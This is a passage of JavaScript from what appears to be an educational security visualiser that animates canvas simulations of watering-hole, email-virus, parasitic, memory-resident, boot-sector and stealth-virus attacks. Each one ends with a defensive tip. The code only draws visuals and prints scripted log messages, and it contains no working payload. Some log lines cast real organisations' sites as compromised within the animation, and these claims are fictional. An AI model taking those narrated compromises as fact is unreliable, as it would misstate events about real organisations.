            ctx.fillText(`[Window: ${seq.window}]`,bX+12,sy+12);
            ctx.fillStyle='#e8ecf4'; ctx.font='9px monospace';
            ctx.fillText(seq.keys.length>70?seq.keys.slice(0,70)+'...':seq.keys,bX+12,sy+28);
        });

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=keysCaptured.toLocaleString();
            if(e1)e1.textContent=credentialsFound;
            if(e2)e2.textContent=`${(keysCaptured*0.02).toFixed(2)} KB`;
            if(e3)e3.textContent=sessionsLogged;
            setProgress(Math.min(100,(frame/360)*100));
        }
        if(frame>=360){setProgress(100);termLog('> Simulation done. Use MFA + virtual keyboard!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateWateringHole = function() {
    termLog('> APT actor profiling target organization...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, sitesCompromised=0, visitorsExposed=0, targetsInfected=0;
    const targetSites=[
        {name:'ISACA Forum',url:'isaca.org/forum',victims:12,color:'#8b5cf6'},
        {name:'ICS-CERT Advisory',url:'ics-cert.cisa.gov',victims:8,color:'#8b5cf6'},
        {name:'DEFCON Talk Archive',url:'defcon.org/talks',victims:5,color:'#8b5cf6'},
    ];
    let compromised=[];
    const flowParticles=[];

    const org={x:w/2,y:h*0.7,label:'TARGET ORG'};
    const attacker={x:w*0.5,y:h*0.05,label:'APT ACTOR'};

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Watering hole planted on isaca.org/forum!','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Target employee visiting poisoned site...','warning');},1500);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(3);termLog('> Browser exploit triggered — malware delivered!','error');},2400);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        ctx.shadowBlur=15; ctx.shadowColor='#ff3b3b';
        ctx.beginPath(); ctx.arc(attacker.x,attacker.y,18,0,Math.PI*2);
        ctx.fillStyle='rgba(255,59,59,0.15)'; ctx.fill();
        ctx.strokeStyle='#ff3b3b'; ctx.lineWidth=2; ctx.stroke(); ctx.shadowBlur=0;
        ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
        ctx.fillText(attacker.label,attacker.x,attacker.y+20);
        ctx.beginPath(); ctx.arc(org.x,org.y,22,0,Math.PI*2);
        ctx.fillStyle='rgba(59,130,246,0.12)'; ctx.fill();
        ctx.strokeStyle='#3b82f6'; ctx.lineWidth=2; ctx.stroke();
        ctx.fillStyle='#3b82f6'; ctx.font='bold 9px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
        ctx.fillText(org.label,org.x,org.y+24);
        if(frame%80===0&&compromised.length<targetSites.length){
            compromised.push(targetSites[compromised.length]);
            sitesCompromised++;
            termLog(`> ${targetSites[compromised.length-1].name} — COMPROMISED!`,'error');
        }

        const positions=[
            {x:w*0.2,y:h*0.38},{x:w*0.5,y:h*0.32},{x:w*0.8,y:h*0.38}
        ];

        targetSites.forEach((site,i)=>{
            const pos=positions[i];
            const isComp=compromised.includes(site);
            ctx.shadowBlur=isComp?12:0; ctx.shadowColor='#8b5cf6';
            ctx.beginPath(); ctx.arc(pos.x,pos.y,20,0,Math.PI*2);
            ctx.fillStyle=isComp?'rgba(139,92,246,0.2)':'rgba(255,255,255,0.03)'; ctx.fill();
            ctx.strokeStyle=isComp?'#8b5cf6':'rgba(255,255,255,0.1)'; ctx.lineWidth=isComp?2:1; ctx.stroke();
            ctx.shadowBlur=0;
            ctx.fillStyle=isComp?'#8b5cf6':'#525c70'; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
            ctx.fillText(site.name,pos.x,pos.y+22); ctx.fillText(site.url,pos.x,pos.y+33);
            if(isComp)ctx.fillText('POISONED!',pos.x,pos.y+44);
            if(isComp){
                ctx.beginPath(); ctx.setLineDash([4,4]); ctx.moveTo(attacker.x,attacker.y+18); ctx.lineTo(pos.x,pos.y-20);
                ctx.strokeStyle='rgba(255,59,59,0.3)'; ctx.lineWidth=1; ctx.stroke(); ctx.setLineDash([]);
                ctx.beginPath(); ctx.moveTo(pos.x,pos.y+20); ctx.lineTo(org.x,org.y-22);
                ctx.strokeStyle='rgba(139,92,246,0.3)'; ctx.lineWidth=1; ctx.stroke();
            }
        });
        if(frame>100&&frame%30===0&&sitesCompromised>0){
            const pos=positions[rndInt(0,Math.min(sitesCompromised,3))];
            flowParticles.push({x:pos.x,y:pos.y+20,tx:org.x,ty:org.y-22,p:0});
            visitorsExposed++;
        }

        flowParticles.forEach(fp=>{
            fp.p+=0.02;
            const px=fp.x+(fp.tx-fp.x)*fp.p, py=fp.y+(fp.ty-fp.y)*fp.p;
            ctx.beginPath(); ctx.arc(px,py,4,0,Math.PI*2);
            ctx.fillStyle=`rgba(139,92,246,${1-fp.p*0.5})`; ctx.fill();
            if(fp.p>=1&&!fp.infected){
                fp.infected=true; targetsInfected++;
                termLog(`> Employee infected via ${targetSites[rndInt(0,sitesCompromised)].name}!`,'error');
                if(targetsInfected>=2)activateStep(4);
            }
        });
        flowParticles.splice(0,flowParticles.filter(p=>p.p>=2).length);

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=sitesCompromised;
            if(e1)e1.textContent=visitorsExposed;
            if(e2)e2.textContent=targetsInfected;
            if(e3)e3.textContent=`${Math.round(frame/3)} days`;
            setProgress(Math.min(100,(frame/380)*100));
        }
        if(frame>=380){setProgress(100);termLog('> Simulation done. Use browser isolation!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateEmailVirus = function() {
    termLog('> Connecting to SMTP mail server...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, emailsSent = 0, filesInfected = 0, contactsFound = 0, mailLoad = 0;
    const contacts = [
        { name: 'john.doe@corporate.com', x: w * 0.15, y: h * 0.75, status: 'clean' },
        { name: 'finance.admin@org.org', x: w * 0.38, y: h * 0.8, status: 'clean' },
        { name: 'it.helpdesk@net.net', x: w * 0.62, y: h * 0.8, status: 'clean' },
        { name: 'ceo.office@major.com', x: w * 0.85, y: h * 0.75, status: 'clean' }
    ];
    const localFiles = [
        { name: 'explorer.exe', x: w * 0.25, y: h * 0.35, status: 'clean' },
        { name: 'notepad.exe', x: w * 0.5, y: h * 0.35, status: 'clean' },
        { name: 'calc.exe', x: w * 0.75, y: h * 0.35, status: 'clean' }
    ];
    const packets = [];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Attachment invoice.exe clicked. Loader spawned!', 'error'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Scanning disk. Injecting payload into local processes...', 'warning'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); contactsFound = 4; termLog('> Accessing local address books... 4 contacts found.', 'warning'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Mass mailing initiated. Sending infected attachments...', 'error'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        const hostX = w / 2, hostY = h * 0.55;
        ctx.shadowBlur = 10; ctx.shadowColor = filesInfected > 0 ? '#ff3b3b' : '#00f0ff';
        ctx.beginPath(); ctx.arc(hostX, hostY, 25, 0, Math.PI * 2);
        ctx.fillStyle = filesInfected > 0 ? 'rgba(255, 59, 59, 0.15)' : 'rgba(0, 240, 255, 0.15)'; ctx.fill();
        ctx.strokeStyle = filesInfected > 0 ? '#ff3b3b' : '#00f0ff'; ctx.lineWidth = 2; ctx.stroke(); ctx.shadowBlur = 0;
        ctx.fillStyle = '#fff'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText('HOST', hostX, hostY - 4);
        ctx.fillText('WORKSTATION', hostX, hostY + 6);
        if (frame > 84 && frame < 132 && frame % 16 === 0) {
            const idx = Math.floor((frame - 85) / 16);
            if (localFiles[idx]) {
                localFiles[idx].status = 'infected';
                filesInfected++;
                termLog(`> File infected: C:\\Windows\\System32\\${localFiles[idx].name}`, 'error');
            }
        }
        localFiles.forEach(f => {
            const isInf = f.status === 'infected';
            ctx.fillStyle = isInf ? 'rgba(255, 59, 59, 0.2)' : 'rgba(255, 255, 255, 0.05)';
            ctx.strokeStyle = isInf ? '#ff3b3b' : 'rgba(255, 255, 255, 0.15)';
            ctx.beginPath(); ctx.roundRect(f.x - 30, f.y - 12, 60, 24, 4); ctx.fill(); ctx.stroke();
            ctx.fillStyle = isInf ? '#ff3b3b' : '#8892a8'; ctx.font = '9px monospace'; ctx.textAlign = 'center';
            ctx.fillText(f.name, f.x, f.y + 4);
            ctx.beginPath(); ctx.moveTo(f.x, f.y + 12); ctx.lineTo(hostX, hostY - 25);
            ctx.strokeStyle = isInf ? 'rgba(255, 59, 59, 0.3)' : 'rgba(255, 255, 255, 0.05)'; ctx.stroke();
        });
        if (frame > 180 && frame % 25 === 0 && emailsSent < 40) {
            const dest = contacts[rndInt(0, 4)];
            packets.push({ x: hostX, y: hostY, tx: dest.x, ty: dest.y, p: 0, target: dest });
            emailsSent++;
            mailLoad = Math.min(100, mailLoad + 8);
        }
        contacts.forEach(c => {
            const isComp = c.status === 'compromised';
            ctx.beginPath(); ctx.arc(c.x, c.y, 8, 0, Math.PI * 2);
            ctx.fillStyle = isComp ? '#ff3b3b' : 'rgba(255, 255, 255, 0.1)'; ctx.fill();
            ctx.strokeStyle = isComp ? '#ff3b3b' : '#8892a8'; ctx.stroke();
            ctx.fillStyle = isComp ? '#ff3b3b' : '#8892a8'; ctx.font = '8px monospace'; ctx.textAlign = 'center';
            ctx.fillText(c.name.split('@')[0], c.x, c.y + 18);
        });

        packets.forEach(p => {
            p.p += 0.025;
            const px = p.x + (p.tx - p.x) * p.p;
            const py = p.y + (p.ty - p.y) * p.p;
            ctx.beginPath(); ctx.arc(px, py, 4, 0, Math.PI * 2);
            ctx.fillStyle = '#ff3b3b'; ctx.fill();
            if (p.p >= 1) {
                p.target.status = 'compromised';
                p.dead = true;
                termLog(`> Inbound SMTP connection resolved: Email dispatched to ${p.target.name}`, 'warning');
            }
        });
        for (let i = packets.length - 1; i >= 0; i--) {
            if (packets[i].dead) packets.splice(i, 1);
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = emailsSent;
            if (e1) e1.textContent = filesInfected;
            if (e2) e2.textContent = contactsFound;
            if (e3) e3.textContent = `${Math.min(100, Math.round(mailLoad))}%`;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Email virus spreads successfully. Filter gateway blocks exe attachments!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateParasiticVirus = function() {
    termLog('> Loading process execution analyzer...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, checked = 0, poisoned = 0;
    const executables = [
        { name: 'word.exe', x: w * 0.2, y: h * 0.45, inf: false, progress: 0 },
        { name: 'chrome.exe', x: w * 0.5, y: h * 0.45, inf: false, progress: 0 },
        { name: 'outlook.exe', x: w * 0.8, y: h * 0.45, inf: false, progress: 0 }
    ];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> User runs infected program: word.exe. Control hijacked!', 'error'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Scanning folder C:\\Program Files for executable headers...', 'warning'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Modifying binary headers. Prepending malicious block...', 'error'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Executing clean payload. Redirecting control back to host...', 'success'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('PARASITIC BINARY INJECTION SIMULATION', w / 2, 25);
        if (frame === 60) executables[0].inf = true; // infected initially
        if (frame > 90 && frame < 200 && frame % 1 === 0) {
            checked = Math.min(220, checked + 2);
        }
        if (frame === 130) {
            executables[1].inf = true;
            poisoned = 1;
            termLog('> Host chrome.exe header modified. Entry point hijacked!', 'error');
        }
        if (frame === 180) {
            executables[2].inf = true;
            poisoned = 2;
            termLog('> Host outlook.exe header modified. Entry point hijacked!', 'error');
        }

        executables.forEach((ex, idx) => {
            const bx = ex.x - 45, by = ex.y - 60, bw = 90, bh = 120;
            ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
            ctx.strokeStyle = ex.inf ? '#ff3b3b' : 'rgba(255, 255, 255, 0.1)';
            ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(bx, by, bw, bh, 6); ctx.fill(); ctx.stroke();
            ctx.fillStyle = ex.inf ? '#ff3b3b' : '#8892a8'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
            ctx.fillText(ex.name, ex.x, by - 8);
            ctx.fillStyle = 'rgba(0, 240, 255, 0.08)';
            ctx.strokeStyle = 'rgba(0, 240, 255, 0.2)';
            ctx.beginPath(); ctx.roundRect(bx + 6, by + 40, bw - 12, bh - 48, 4); ctx.fill(); ctx.stroke();
            ctx.fillStyle = '#525c70'; ctx.font = '8px monospace';
            ctx.fillText('Original Host', ex.x, by + 75);
            ctx.fillText('Code Segment', ex.x, by + 87);
            if (ex.inf) {
                ctx.fillStyle = 'rgba(255, 59, 59, 0.2)';
                ctx.strokeStyle = '#ff3b3b';
                ctx.beginPath(); ctx.roundRect(bx + 6, by + 8, bw - 12, 26, 4); ctx.fill(); ctx.stroke();
                ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 7px monospace';
                ctx.fillText('VIRUS HEADER', ex.x, by + 20);
                ctx.fillText('(Prepended Payload)', ex.x, by + 30);
                ctx.beginPath(); ctx.moveTo(ex.x, by - 20); ctx.lineTo(ex.x, by + 8);
                ctx.strokeStyle = '#ffaa00'; ctx.lineWidth = 2; ctx.stroke();
                ctx.beginPath(); ctx.moveTo(ex.x - 3, by + 5); ctx.lineTo(ex.x, by + 8); ctx.lineTo(ex.x + 3, by + 5); ctx.stroke();
                ctx.beginPath(); ctx.moveTo(ex.x, by + 34); ctx.lineTo(ex.x, by + 40);
                ctx.strokeStyle = '#39ff14'; ctx.stroke();
            } else {
                ctx.beginPath(); ctx.moveTo(ex.x, by - 20); ctx.lineTo(ex.x, by + 40);
                ctx.strokeStyle = '#00f0ff'; ctx.lineWidth = 1; ctx.stroke();
            }
        });

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = checked;
            if (e1) e1.textContent = poisoned + 1; // plus initial
            if (e2) e2.textContent = `${(checked / 3).toFixed(1)}/s`;
            if (e3) e3.textContent = `${512 + poisoned * 45} KB`;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Parasitic virus copies itself and handovers control. Deploy FIM headers checking!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateMemoryResidentVirus = function() {
    termLog('> Allocating process mapping sandbox...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, memoryUsed = 0, intercepts = 0, scans = 0, hooked = 0;
    const memorySlots = [];
    const files = [
        { name: 'config.sys', state: 'clean', y: -20 },
        { name: 'driver.dll', state: 'clean', y: -20 },
        { name: 'cmd.exe', state: 'clean', y: -20 },
        { name: 'hosts.txt', state: 'clean', y: -20 }
    ];

    for (let r = 0; r < 4; r++) {
        for (let c = 0; c < 8; c++) {
            memorySlots.push({ x: w * 0.15 + c * 35, y: h * 0.42 + r * 25, infected: false, label: `0x${rndInt(10,99)}${rndInt(10,99)}` });
        }
    }

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Executable loader written. Allocating High memory (TPA)...', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); hooked = 3; termLog('> Hooking vector IVT: Hooked INT 21h (DOS API), INT 13h (Disk I/O).', 'error'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Intercepting file accesses. Hook is monitoring Open/Close handle requests.', 'warning'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Virus persists dynamically in memory. System infection active.', 'error'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('SYSTEM RAM RESIDENCE & API INTERCEPTION', w / 2, 22);
        if (frame > 40 && frame < 90 && frame % 10 === 0) {
            const idx = Math.floor((frame - 41) / 10);
            if (memorySlots[idx]) {
                memorySlots[idx].infected = true;
                memoryUsed = (idx + 1) * 8;
            }
        }
        ctx.fillStyle = '#525c70'; ctx.font = '8px monospace'; ctx.textAlign = 'left';
        ctx.fillText('SYSTEM RAM MATRIX', w * 0.15, h * 0.38);

        memorySlots.forEach(slot => {
            ctx.fillStyle = slot.infected ? 'rgba(255, 59, 59, 0.35)' : 'rgba(255, 255, 255, 0.02)';
            ctx.strokeStyle = slot.infected ? '#ff3b3b' : 'rgba(255, 255, 255, 0.08)';
            ctx.beginPath(); ctx.roundRect(slot.x, slot.y, 30, 20, 2); ctx.fill(); ctx.stroke();
            ctx.fillStyle = slot.infected ? '#fff' : '#525c70'; ctx.font = '7px monospace'; ctx.textAlign = 'center';
            ctx.fillText(slot.infected ? 'RES' : slot.label, slot.x + 15, slot.y + 12);
        });
        if (hooked > 0) {
            ctx.beginPath(); ctx.moveTo(w * 0.35, h * 0.55); ctx.lineTo(w * 0.65, h * 0.55);
            ctx.strokeStyle = '#ff3b3b'; ctx.lineWidth = 1.5; ctx.stroke();
            ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
            ctx.fillText('HOOKED VECTOR: INT 21h', w * 0.5, h * 0.53);
        }
        const apiX = w * 0.72, apiY = h * 0.6;
        ctx.fillStyle = 'rgba(0, 240, 255, 0.05)';
        ctx.strokeStyle = '#00f0ff';
        ctx.beginPath(); ctx.roundRect(apiX - 40, apiY - 30, 80, 60, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#00f0ff'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText('File Open API', apiX, apiY - 5);
        ctx.fillText('(ReadFile)', apiX, apiY + 10);
        if (frame > 120 && frame % 60 === 0) {
            const fIdx = Math.floor((frame - 120) / 60) % files.length;
            files[fIdx].y = h * 0.15;
            files[fIdx].state = 'clean';
        }

        files.forEach(f => {
            if (f.y >= h * 0.15 && f.y < h * 0.8) {
                f.y += 2;
                if (Math.abs(f.y - apiY) < 15) {
                    if (hooked > 0 && f.state === 'clean') {
                        f.state = 'infected';
                        intercepts++;
                        termLog(`> System call INT 21h intercepted for: ${f.name}. File infected!`, 'error');
                    }
                }
                ctx.fillStyle = f.state === 'infected' ? 'rgba(255, 59, 59, 0.2)' : 'rgba(255, 255, 255, 0.05)';
                ctx.strokeStyle = f.state === 'infected' ? '#ff3b3b' : 'rgba(255, 255, 255, 0.15)';
                ctx.beginPath(); ctx.roundRect(apiX + 70, f.y - 10, 60, 20, 3); ctx.fill(); ctx.stroke();
                ctx.fillStyle = f.state === 'infected' ? '#ff3b3b' : '#8892a8'; ctx.font = '8px monospace';
                ctx.fillText(f.name, apiX + 100, f.y + 2);
            }
        });

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = `${memoryUsed} KB`;
            if (e1) e1.textContent = hooked;
            if (e2) e2.textContent = intercepts;
            if (e3) e3.textContent = Math.round(frame / 4);
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Memory resident virus hooks remain in RAM. Perform cold reboot!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateBootSectorVirus = function() {
    termLog('> Loading Master Boot Record (MBR) analyzer...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, sectorReads = 0, scanned = 0, interceptions = 0, MBRStatus = 'Valid';

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> BIOS loaded boot sector Sector 0 (compromised).', 'error'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Malicious MBR executed. Redirecting system pointers to high memory...', 'error'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Reading original backup MBR from Sector 14. Chain loading OS...', 'warning'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Windows booted successfully. Virus loaded at ring-0. Intercepting IO...', 'error'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('MBR HIJACK & PRE-OS BOOT SEQUENCE', w / 2, 22);
        const biosX = w * 0.18, biosY = h * 0.5;
        const MBRX = w * 0.42, MBRY = h * 0.5;
        const ramX = w * 0.68, ramY = h * 0.35;
        const osX = w * 0.68, osY = h * 0.65;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.03)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(biosX - 35, biosY - 20, 70, 40, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#8892a8'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText('BIOS', biosX, biosY - 4);
        ctx.fillStyle = '#39ff14'; ctx.font = '7px monospace';
        ctx.fillText('POST OK', biosX, biosY + 10);
        const isMBRBad = frame > 40;
        ctx.fillStyle = isMBRBad ? 'rgba(255, 59, 59, 0.1)' : 'rgba(0, 240, 255, 0.05)';
        ctx.strokeStyle = isMBRBad ? '#ff3b3b' : '#00f0ff';
        ctx.beginPath(); ctx.roundRect(MBRX - 45, MBRY - 30, 90, 60, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isMBRBad ? '#ff3b3b' : '#00f0ff'; ctx.font = 'bold 9px monospace';
        ctx.fillText('SECTOR 0', MBRX, MBRY - 14);
        ctx.fillText('(MBR Boot)', MBRX, MBRY - 2);
        ctx.fillStyle = isMBRBad ? '#ff3b3b' : '#8892a8'; ctx.font = '8px monospace';
        ctx.fillText(isMBRBad ? '[POISONED]' : '[CLEAN]', MBRX, MBRY + 16);
        if (frame > 20) {
            ctx.beginPath(); ctx.moveTo(biosX + 35, biosY); ctx.lineTo(MBRX - 45, MBRY);
            ctx.strokeStyle = isMBRBad ? '#ff3b3b' : '#00f0ff'; ctx.stroke();
            sectorReads = 1;
        }
        if (frame > 60) {
            ctx.beginPath(); ctx.moveTo(MBRX + 45, MBRY - 10); ctx.lineTo(ramX - 45, ramY);
            ctx.strokeStyle = '#ff3b3b'; ctx.stroke();
            ctx.fillStyle = 'rgba(255, 59, 59, 0.2)'; ctx.strokeStyle = '#ff3b3b';
            ctx.beginPath(); ctx.roundRect(ramX - 45, ramY - 20, 90, 40, 4); ctx.fill(); ctx.stroke();
            ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 8px monospace';
            ctx.fillText('HIGH MEMORY', ramX, ramY - 4);
            ctx.fillText('(Virus Active)', ramX, ramY + 10);
            MBRStatus = 'Corrupt';
        }
        if (frame > 130) {
            ctx.beginPath(); ctx.moveTo(MBRX + 45, MBRY + 10); ctx.lineTo(osX - 45, osY);
            ctx.strokeStyle = '#39ff14'; ctx.stroke();
            ctx.fillStyle = 'rgba(57, 255, 20, 0.1)'; ctx.strokeStyle = '#39ff14';
            ctx.beginPath(); ctx.roundRect(osX - 45, osY - 20, 90, 40, 4); ctx.fill(); ctx.stroke();
            ctx.fillStyle = '#39ff14'; ctx.font = 'bold 9px monospace';
            ctx.fillText('WINDOWS OS', osX, osY - 4);
            ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
            ctx.fillText('BOOTED SUCCESS', osX, osY + 10);
            sectorReads = 2;
        }
        if (frame > 200) {
            ctx.beginPath(); ctx.setLineDash([3, 3]);
            ctx.moveTo(osX, osY - 20); ctx.lineTo(ramX, ramY + 20);
            ctx.strokeStyle = '#ff3b3b'; ctx.stroke(); ctx.setLineDash([]);
            interceptions = Math.min(48, Math.round((frame - 200) / 3));
            scanned = Math.min(5, Math.round((frame - 200) / 30));
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = MBRStatus;
            if (e1) e1.textContent = sectorReads;
            if (e2) e2.textContent = scanned;
            if (e3) e3.textContent = interceptions;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Boot sector virus loaded before the OS. Enable Secure Boot and MBR recovery!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateStealthVirus = function() {
    termLog('> Spawning antivirus scanning monitor...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, hooks = 0, spoofs = 0, bytesSpoofed = 0;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Stealth virus loaded in system drivers. Hooking NTReadRequest...', 'error'); hooks = 1; }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Antivirus scanner initiated scanning loop on disk...', 'warning'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Read request intercepted for explorer.exe! Spoofing payload...', 'error'); spoofs = 1; }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Antivirus scan reports: explorer.exe [SAFE]. Threat evaded.', 'success'); bytesSpoofed = 124; }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('STEALTH VECTOR SPOOFING & I/O HOOKING', w / 2, 22);
        const avX = w * 0.18, avY = h * 0.45;
        const driverX = w * 0.5, driverY = h * 0.45;
        const diskX = w * 0.82, diskY = h * 0.45;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = '#00f0ff';
        ctx.beginPath(); ctx.roundRect(avX - 45, avY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#00f0ff'; ctx.font = 'bold 9px monospace';
        ctx.fillText('AV SCANNER', avX, avY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('Scanning...', avX, avY - 5);
        if (frame > 220) {
            ctx.fillStyle = '#39ff14'; ctx.font = 'bold 9px monospace';
            ctx.fillText('STATUS: SAFE', avX, avY + 20);
        } else {
            ctx.fillText('Parsing disk...', avX, avY + 15);
        }
        const isHookActive = frame > 40;
        ctx.fillStyle = isHookActive ? 'rgba(255, 59, 59, 0.15)' : 'rgba(255, 255, 255, 0.03)';
        ctx.strokeStyle = isHookActive ? '#ff3b3b' : 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(driverX - 55, driverY - 40, 110, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isHookActive ? '#ff3b3b' : '#8892a8'; ctx.font = 'bold 9px monospace';
        ctx.fillText('SYSTEM KERNEL', driverX, driverY - 20);
        ctx.fillText('FILE SYSTEM I/O', driverX, driverY - 8);
        ctx.fillStyle = isHookActive ? '#ff3b3b' : '#525c70'; ctx.font = '7px monospace';
        ctx.fillText(isHookActive ? '[HOOK ACTIVE]' : '[SECURE]', driverX, driverY + 20);
        ctx.fillStyle = 'rgba(255, 59, 59, 0.1)'; ctx.strokeStyle = '#ff3b3b';
        ctx.beginPath(); ctx.roundRect(diskX - 45, diskY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
